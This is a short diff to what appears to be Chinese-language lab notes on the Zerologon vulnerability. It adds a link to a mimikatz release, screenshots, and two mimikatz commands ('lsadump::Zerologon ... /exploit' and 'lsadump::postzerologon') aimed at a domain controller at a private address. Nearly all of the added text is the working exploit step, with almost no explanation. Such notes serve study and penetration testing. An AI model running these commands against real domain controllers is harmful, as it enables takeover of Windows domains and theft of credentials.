@@ -91,3 +91,9 @@ Zerologon
 ---
     下載新版mimikatz
  [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)
+![image](https://github.com/user-attachments/assets/c1213384-fed5-4171-ad7b-a0fd068dc5ad)
+
+    執行mimikatz並dump
+    lsadump::Zerologon /target:192.168.177.19 /account:server2019$ /null /ntlm /exploit
+    lsadump::postzerologon /target:192.168.177.19 /account:server2019$
+![image](https://github.com/user-attachments/assets/07bd99c9-3e5b-417a-b4ce-33f5628990bd)
